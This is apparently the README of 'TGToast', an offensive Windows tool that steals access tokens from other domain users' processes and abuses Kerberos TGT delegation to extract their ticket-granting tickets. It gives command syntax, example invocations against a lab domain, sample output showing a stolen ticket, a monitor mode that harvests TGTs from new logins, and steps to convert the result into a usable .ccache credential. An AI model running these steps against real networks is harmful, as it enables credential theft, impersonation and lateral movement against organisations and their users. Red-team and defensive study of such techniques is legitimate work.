
```
  .\TGToast.exe

      _   __           __________________                 __
     ( `^` ))         /_  __/ ____/_  __/___  ____ ______/ /_
     |     ||          / / / / __  / / / __ \/ __ `/ ___/ __/
     |     ||         / / / /_/ / / / / /_/ / /_/ (__  ) /_
     '-----'`        /_/  \____/ /_/  \____/\__,_/____/\__/


Tool to perform TGT delegation abuse, with token stealing capabilities.

Usage: C:\Users\eddard.stark\source\repos\TGToasty\x64\Release\TGToast.exe <option> [arguments]

Options:
  /list                                 Lists processes from other domain users.
  /steal <PID> <domain> <spn> [/enctype:TYPE]   Steals token, impersonates, and runs tgtdelegation.
  /monitor <domain> <spn> [/enctype:TYPE]       Monitors for new user logins and auto-extracts TGTs.

  Encryption types (optional): aes256 (default), aes128, rc4

Examples:
  C:\Users\eddard.stark\source\repos\TGToasty\x64\Release\TGToast.exe /steal 6969 corp.local CIFS/dc01.corp.local
  C:\Users\eddard.stark\source\repos\TGToasty\x64\Release\TGToast.exe /steal 6969 corp.local CIFS/dc01.corp.local /enctype:aes256
  C:\Users\eddard.stark\source\repos\TGToasty\x64\Release\TGToast.exe /monitor corp.local CIFS/dc01.corp.local
  C:\Users\eddard.stark\source\repos\TGToasty\x64\Release\TGToast.exe /monitor corp.local CIFS/dc01.corp.local /enctype:rc4
```
## Purpose
The goal is to *impersonate* a user who is connected to a machine that is controlled by an attacker and recover their TGT. You need *elevated privileges* on the host.

First, we will steal a token from another user (for example some juicy *Domain Admins*). Then, we will use the *TGTDeleg technique*, which abuses the Kerberos GSS-API to retrieve a usable TGT for the current user. Next, *AcquireCredentialsHandle()* is used to retrieve the user's Kerberos security credentials. Then, *InitializeSecurityContext()* is called with the ISC_REQ_DELEGATE flag and a target SPN (such as HOST/DC.domain.com) to prepare a delegation context to be sent to the DC. This results in an AP-REQ in the GSS-API output containing a KRB_CRED structure in the authenticator field that includes the TGT.

## Usage
### List
```
./TGToast.exe /list

      _   __           __________________                 __
     ( `^` ))         /_  __/ ____/_  __/___  ____ ______/ /_
     |     ||          / / / / __  / / / __ \/ __ `/ ___/ __/
     |     ||         / / / /_/ / / / / /_/ / /_/ (__  ) /_
     '-----'`        /_/  \____/ /_/  \____/\__,_/____/\__/

[*] Current User: NORTH\eddard.stark
[*] Searching for processes belonging to other DOMAIN users...

PID    | User                                     | Process Name
----------------------------------------------------------------------------
2944   | NORTH\robb.stark                         | sihost.exe
596    | NORTH\robb.stark                         | svchost.exe
3080   | NORTH\robb.stark                         | taskhostw.exe
3272   | NORTH\robb.stark                         | ctfmon.exe
3524   | NORTH\robb.stark                         | explorer.exe
3760   | NORTH\robb.stark                         | ShellExperienceHost.exe
3840   | NORTH\robb.stark                         | SearchUI.exe
3956   | NORTH\robb.stark                         | RuntimeBroker.exe
4068   | NORTH\robb.stark                         | RuntimeBroker.exe
3120   | NORTH\robb.stark                         | RuntimeBroker.exe
968    | NORTH\robb.stark                         | smartscreen.exe
4860   | NORTH\robb.stark                         | mstsc.exe
```

### TGToasting
```
./TGToast.exe /steal 3524 north.sevenkingdoms.local CIFS/winterfell.north.sevenkingdoms.local

      _   __           __________________                 __
     ( `^` ))         /_  __/ ____/_  __/___  ____ ______/ /_
     |     ||          / / / / __  / / / __ \/ __ `/ ___/ __/
     |     ||         / / / /_/ / / / / /_/ / /_/ (__  ) /_
     '-----'`        /_/  \____/ /_/  \____/\__,_/____/\__/

[+] SeDebugPrivilege enabled.
[*] Attempting to steal token from PID 3524...
[+] Successfully stole token from user: NORTH\robb.stark
[*] Successfully impersonating user. Now attempting TGT delegation abuse...
----------------------------------------------------------------------------
[+] Target Domain (for reference): north.sevenkingdoms.local
[+] Target SPN: CIFS/winterfell.north.sevenkingdoms.local
[+] Successfully obtained a handle to the current credentials set!
[+] Successfully initialized the Kerberos GSS-API!
[+] The delegation request was successful! AP-REQ ticket is now in the GSS-API output.
[+] Successfully invoked LsaCallAuthenticationPackage! The Kerberos session key should be cached!

[+] AP-REQ output:
YI...(snip)...91pPYw==

[+] Kerberos session key:
Ab1lnjT...(snip)...pEcFY=

[+] Encryption:
AES256

[+] tgtdelegation succeeded under impersonated context!
----------------------------------------------------------------------------
[*] TGT delegation attempt finished. Reverting to original identity.
```
### TGToast Monitor
Monitors for new user logins and auto-extracts TGTs.
```
 .\TGToast.exe /monitor north.sevenkingdoms.local TIME/winterfell.north.sevenkingdoms.local

      _   __           __________________                 __
     ( `^` ))         /_  __/ ____/_  __/___  ____ ______/ /_
     |     ||          / / / / __  / / / __ \/ __ `/ ___/ __/
     |     ||         / / / /_/ / / / / /_/ / /_/ (__  ) /_
     '-----'`        /_/  \____/ /_/  \____/\__,_/____/\__/


[*] Monitoring for new domain users. Press Ctrl+C to stop.
```

## Extract TGT
You can use TGTParse.py code to extract the TGT from the AP-REQ using the session key.
The TGTParse.py code was a refactor of the version available on Github : [https://github.com/connormcgarr/tgtdelegation/tree/master/tgtParse](https://github.com/connormcgarr/tgtdelegation/tree/master/tgtParse) by Connor McGarr (@33y0re).
```
python TGTParse.py  --sessionkey W0612fo...(snip)...43JYdqc= --apreq YIINBwYJKoZIh...(snip)...vcSAQICAysc3 --etype AES256

[+] Identified ticket for robb.stark@NORTH.SEVENKINGDOMS.LOCAL
[+] Successfully extracted the TGT! Saved as: robb.stark@NORTH.SEVENKINGDOMS.LOCAL.ccache!
[*] Local path to usable .ccache: /home/wuentin/Desktop/TGToast/robb.stark@NORTH.SEVENKINGDOMS.LOCAL.ccache
[*] Usage: export KRB5CCNAME=/home/wuentin/Desktop/TGToast/robb.stark@NORTH.SEVENKINGDOMS.LOCAL.ccache

```

### Usage
```
# Create virtual environment
python3 -m venv tgtparse-env

# Activate virtual environment
source tgtparse-env/bin/activate 

# Install dependencies
pip install impacket pyasn1

# Run the tool
python3 tgtParse.py --apreq <BASE64_APREQ> --sessionkey <BASE64_KEY> --etype <AES256|AES128|RC4>
```
## Limits
There are a few limitations, it doesn't work if the target accounts are:
- member of protected users;
- account is sensitive and cannot be delegated.
## Overview
Attack flow diagram showing how TGTToast steals process tokens, impersonates users, and abuses Kerberos delegation APIs to extract usable TGTs.

<img width="1082" height="1751" alt="image" src="https://github.com/user-attachments/assets/7f6cf0a2-e037-4bbf-86b8-e3f47a420922" />

## Credits
Many thanks to these projects, all I did was put the ideas together.
- [Kekeo](https://github.com/gentilkiwi/kekeo)
- [Rubeus-now-with-more-kekeo](https://blog.harmj0y.net/redteaming/rubeus-now-with-more-kekeo/)
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [https://github.com/GhostPack/Rubeus/blob/master/Rubeus/lib/LSA.cs](https://github.com/GhostPack/Rubeus/blob/master/Rubeus/lib/LSA.cs)
- [https://github.com/connormcgarr/tgtdelegation/tree/master](https://github.com/connormcgarr/tgtdelegation/tree/master)
